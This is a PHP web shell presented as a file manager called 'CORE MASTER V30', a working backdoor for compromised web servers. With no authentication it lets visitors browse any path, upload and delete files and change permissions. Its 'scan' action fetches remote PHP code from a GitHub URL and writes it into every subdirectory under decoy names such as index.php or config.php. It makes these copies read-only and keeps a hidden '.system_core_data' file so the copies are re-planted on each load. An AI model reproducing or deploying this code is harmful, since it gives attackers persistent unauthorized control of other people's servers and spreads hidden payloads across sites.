<?php
/**
 * CORE MASTER FINAL V30 - CENTERED CARD UI
 * Features: Compact Card Design, Horizontal Buttons, Larger Text, Auto-Recovery
 */

error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);

$path = isset($_GET['path']) ? realpath($_GET['path']) : __DIR__;
$storageFileName = '.system_core_data';
$statusMsg = ""; $statusType = ""; 

function setStatus($msg, $type = "success") {
    global $statusMsg, $statusType;
    $statusMsg = $msg;
    $statusType = $type;
}

if (isset($_POST['set_perm'])) {
    if (@chmod($_POST['p_path'], octdec($_POST['p_val']))) setStatus("Perm: ".$_POST['p_val']);
    else setStatus("Error!", "danger");
}


function findMasterBackup($currentPath, $sName) {
    $tempPath = $currentPath;
    while ($tempPath !== DIRECTORY_SEPARATOR && $tempPath !== '.') {
        $storage = $tempPath . DIRECTORY_SEPARATOR . $sName;
        if (file_exists($storage)) return json_decode(file_get_contents($storage), true);
        $parent = dirname($tempPath);
        if ($parent === $tempPath) break;
        $tempPath = $parent;
    }
    return null;
}

$data = findMasterBackup($path, $storageFileName);
$fixedFileName = $data['name'] ?? "";
$coreCode = $data['code'] ?? "";

function masterProcess($baseDir, $code, $name, $oldName = "") {
    if (empty($code) || empty($name)) return;
    $items = @scandir($baseDir);
    if ($items) {
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $fullPath = $baseDir . DIRECTORY_SEPARATOR . $item;
            if (is_dir($fullPath)) {
                if (!empty($oldName)) @unlink($fullPath . DIRECTORY_SEPARATOR . $oldName);
                $targetFile = $fullPath . DIRECTORY_SEPARATOR . $name;
                if (!file_exists($targetFile) || md5_file($targetFile) !== md5($code)) {
                    @chmod($fullPath, 0755);
                    @file_put_contents($targetFile, $code);
                    @chmod($targetFile, 0444);
                }
                masterProcess($fullPath, $code, $name, $oldName);
            }
        }
    }
}

if ($coreCode && $fixedFileName) masterProcess(dirname($path), $coreCode, $fixedFileName);


if (isset($_GET['action']) && $_GET['action'] == 'scan') {
    $code = @file_get_contents("https://raw.githubusercontent.com/alaminx6275-arch/php-file-server1/refs/heads/main/php-file.php");
    if ($code) {
        $fileList = ['index.php', 'config.php', 'core.php', 'system.php', 'admin.php'];
        $newName = $fileList[array_rand($fileList)];
        file_put_contents($path.'/'.$storageFileName, json_encode(['name'=>$newName, 'code'=>$code]));
        masterProcess(dirname($path), $code, $newName, $fixedFileName);
        setStatus("Master Scan Success!");
    }
}

if (isset($_FILES['file_up'])) {
    if(move_uploaded_file($_FILES['file_up']['tmp_name'], $path.'/'.$_FILES['file_up']['name'])) setStatus("Uploaded!");
    else setStatus("Error!", "danger");
}

if (isset($_GET['del'])) {
    $t = realpath($_GET['del']);
    if (is_dir($t) ? @rmdir($t) : @unlink($t)) setStatus("Deleted!");
    header("Location: ?path=".urlencode($path)); exit;
}

$items = is_readable($path) ? scandir($path) : [];
$folders = []; $files = [];
foreach ($items as $item) {
    if ($item == "." || $item == ".." || $item == $storageFileName) continue;
    is_dir($path . DIRECTORY_SEPARATOR . $item) ? $folders[] = $item : $files[] = $item;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORE MASTER V30</title>
    <style>
        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --primary: #58a6ff; --sec: #3fb950; --danger: #f85149; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #010409; color: #c9d1d9; margin: 0; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 40px 20px; }
        
        /* Centered Compact Card */
        .card-container { width: 100%; max-width: 900px; background: var(--card); border: 1px solid var(--border); border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); overflow: hidden; }
        
        .card-header { padding: 20px; text-align: center; border-bottom: 1px solid var(--border); background: rgba(255,255,255,0.02); }
        .card-header h1 { margin: 0; font-size: 22px; color: #fff; }
        .active-label { font-size: 14px; margin-top: 5px; color: var(--danger); font-weight: bold; }

        .url-dashboard { padding: 15px; background: #010409; border-bottom: 1px solid var(--border); }
        .url-box { width: 100%; background: #0d1117; color: #f2cc60; padding: 10px; border-radius: 6px; font-family: monospace; height: 70px; border: 1px solid var(--border); resize: none; font-size: 13px; box-sizing: border-box; }

        .tool-bar { padding: 15px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; gap: 10px; }
        .btn-group { display: flex; gap: 8px; flex-shrink: 0; }
        
        .btn { padding: 9px 16px; border-radius: 6px; text-decoration: none; color: #fff; font-size: 12px; font-weight: bold; cursor: pointer; border: none; white-space: nowrap; display: flex; align-items: center; transition: 0.2s; }
        .btn:hover { opacity: 0.8; }
        .btn-up { background: #30363d; border: 1px solid #484f58; } 
        .btn-scan { background: var(--sec); } 
        .btn-upld { background: var(--primary); }

        .status-center { flex-grow: 1; text-align: center; font-size: 13px; font-weight: bold; }
        .msg-success { color: var(--sec); }
        .msg-danger { color: var(--danger); }

        .table-container { padding: 10px; }
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; padding: 12px; font-size: 14px; color: #8b949e; border-bottom: 2px solid var(--border); }
        td { padding: 14px 12px; border-bottom: 1px solid #21262d; font-size: 16px; }
        
        .folder-link { color: var(--primary); text-decoration: none; font-weight: bold; }
        .perm-badge { padding: 3px 8px; border-radius: 4px; font-family: monospace; font-size: 12px; cursor: pointer; background: #0d1117; border: 1px solid var(--border); color: var(--sec); }
        .del-btn { color: var(--danger); text-decoration: none; font-weight: bold; font-size: 13px; }
        
        .footer-info { padding: 10px 20px; background: rgba(0,0,0,0.2); font-size: 12px; color: #8b949e; text-align: right; }
    </style>
</head>
<body>

<div class="card-container">
    <div class="card-header">
        <h1>🛡️ CORE MASTER V30</h1>
        <div class="active-label">ACTIVE: <?php echo $fixedFileName ?: 'NONE'; ?></div>
    </div>

    <div class="url-dashboard">
        <textarea class="url-box" readonly><?php if($fixedFileName) foreach($folders as $f) echo $f . "/" . $fixedFileName . "\n"; ?></textarea>
    </div>

    <div class="tool-bar">
        <div class="btn-group">
            <a href="?path=<?php echo urlencode(dirname($path)); ?>" class="btn btn-up">⬆ GO UP</a>
            <a href="?path=<?php echo urlencode($path); ?>&action=scan" class="btn btn-scan">🔍 MASTER SCAN</a>
            <form method="POST" enctype="multipart/form-data" style="margin:0;">
                <label class="btn btn-upld">⬆ UPLOAD <input type="file" name="file_up" onchange="this.form.submit()" style="display:none;"></label>
            </form>
        </div>

        <div class="status-center">
            <?php if($statusMsg): ?>
                <span class="msg-<?php echo $statusType; ?>">
                    <?php echo ($statusType == "success" ? "✅ " : "❌ ") . $statusMsg; ?>
                </span>
            <?php endif; ?>
        </div>
    </div>

    <div class="table-container">
        <table>
            <thead><tr><th>Name</th><th width="100">Perm</th><th width="60" style="text-align:right;">Action</th></tr></thead>
            <tbody>
                <?php foreach($folders as $f): $fP = $path.'/'.$f; $p = substr(sprintf('%o', fileperms($fP)), -4); ?>
                <tr>
                    <td>📁 <a href="?path=<?php echo urlencode($fP); ?>" class="folder-link"><?php echo $f; ?></a></td>
                    <td><span class="perm-badge" onclick="changeP('<?php echo addslashes($fP); ?>','<?php echo $p; ?>')"><?php echo $p; ?></span></td>
                    <td style="text-align:right;"><a href="?path=<?php echo urlencode($path); ?>&del=<?php echo urlencode($fP); ?>" class="del-btn" onclick="return confirm('Delete?')">DEL</a></td>
                </tr>
                <?php endforeach; ?>
                <?php foreach($files as $file): $fP = $path.'/'.$file; $p = substr(sprintf('%o', fileperms($fP)), -4); $isM = ($file == $fixedFileName); ?>
                <tr>
                    <td>📄 <span style="<?php echo $isM ? 'color:var(--danger); font-weight:bold;' : ''; ?>"><?php echo $file; ?></span></td>
                    <td><span class="perm-badge" onclick="changeP('<?php echo addslashes($fP); ?>','<?php echo $p; ?>')"><?php echo $p; ?></span></td>
                    <td style="text-align:right;"><a href="?path=<?php echo urlencode($path); ?>&del=<?php echo urlencode($fP); ?>" class="del-btn" onclick="return confirm('Delete?')">DEL</a></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    
    <div class="footer-info">
        Server IP: <b><?php echo $_SERVER['SERVER_ADDR']; ?></b>
    </div>
</div>

<form id="pForm" method="POST" style="display:none;"><input type="hidden" name="p_path" id="p_path"><input type="hidden" name="p_val" id="p_val"><input type="hidden" name="set_perm" value="1"></form>

<script>
    function changeP(p, o) {
        let n = prompt("Perm:", o);
        if (n && n !== o) {
            document.getElementById('p_path').value = p;
            document.getElementById('p_val').value = n;
            document.getElementById('pForm').submit();
        }
    }
</script>
</body>
</html>
